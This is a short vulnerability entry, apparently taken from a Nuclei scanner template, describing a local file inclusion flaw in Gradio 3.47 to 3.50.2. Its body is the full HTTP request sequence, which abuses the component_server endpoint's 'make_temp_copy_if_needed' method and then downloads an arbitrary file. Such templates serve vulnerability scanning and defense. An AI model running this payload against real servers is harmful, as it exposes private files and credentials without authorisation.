# Vulnerability: Gradio 3.47/3.50.2 - Local File Inclusion
**Classification:** CVE
**Source:** Nuclei Template (`gradio-lfi.yaml`)

## Description
Local file read by calling arbitrary methods of Components class between Gradio versions 3.47 / 3.50.2

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /component_server HTTP/1.1
Host: {{Hostname}}

POST /component_server HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}

GET /file={{download_path}} HTTP/1.1
Host: {{Hostname}}
```

